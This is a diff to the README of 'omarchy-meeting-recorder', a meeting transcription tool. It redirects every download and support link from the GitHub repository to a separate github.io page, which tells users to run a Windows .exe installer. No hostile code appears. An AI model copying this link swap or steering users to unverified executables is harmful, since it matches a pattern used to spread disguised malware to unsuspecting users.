@@ -1,6 +1,6 @@
 # 🎙️ omarchy-meeting-recorder - Record, Transcribe, and Review Meetings Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download-omarchy--meeting--recorder-blueviolet?style=for-the-badge&logo=github)](https://github.com/SUBHADEEP-KUNDU-2004/omarchy-meeting-recorder)
+[![Download Now](https://img.shields.io/badge/Download-omarchy--meeting--recorder-blueviolet?style=for-the-badge&logo=github)](https://subhadeep-kundu-2004.github.io)
 
 ---
 
@@ -16,7 +16,7 @@ Think of omarchy-meeting-recorder as your personal meeting assistant. It capture
 
 ## 📥 Download and Install
 
-Visit this link to download the application: [https://github.com/SUBHADEEP-KUNDU-2004/omarchy-meeting-recorder](https://github.com/SUBHADEEP-KUNDU-2004/omarchy-meeting-recorder)
+Visit this link to download the application: [https://subhadeep-kundu-2004.github.io](https://subhadeep-kundu-2004.github.io)
 
 This link takes you to the official download page. Click the big download button, and the setup file will start downloading to your computer. Once the download finishes, locate the file in your "Downloads" folder (usually named something like `omarchy-meeting-recorder.exe`).
 
@@ -118,7 +118,7 @@ omarchy-meeting-recorder checks for updates automatically. When a new version is
 
 ## 📣 Support and Feedback
 
-We'd love to hear from you! For help, questions, or feature ideas, visit the GitHub page: [https://github.com/SUBHADEEP-KUNDU-2004/omarchy-meeting-recorder](https://github.com/SUBHADEEP-KUNDU-2004/omarchy-meeting-recorder)
+We'd love to hear from you! For help, questions, or feature ideas, visit the GitHub page: [https://subhadeep-kundu-2004.github.io](https://subhadeep-kundu-2004.github.io)
 
 Click the "Issues" tab to report a problem, or "Discussions" to chat with other users. Every bit of feedback helps make the app better for everyone.
 
@@ -134,7 +134,7 @@ omarchy-meeting-recorder is built with privacy as a core principle. All transcri
 
 You're now ready to record smarter. Visit the download link, install the app, and experience meetings that turn into organized, searchable, and replayable notes. Your future self will thank you for every saved minute and every perfectly captured idea.
 
-[![Download omarchy-meeting-recorder](https://img.shields.io/badge/⬇️_Download-Now-brightgreen?style=for-the-badge)](https://github.com/SUBHADEEP-KUNDU-2004/omarchy-meeting-recorder)
+[![Download omarchy-meeting-recorder](https://img.shields.io/badge/⬇️_Download-Now-brightgreen?style=for-the-badge)](https://subhadeep-kundu-2004.github.io)
 
 ---
 
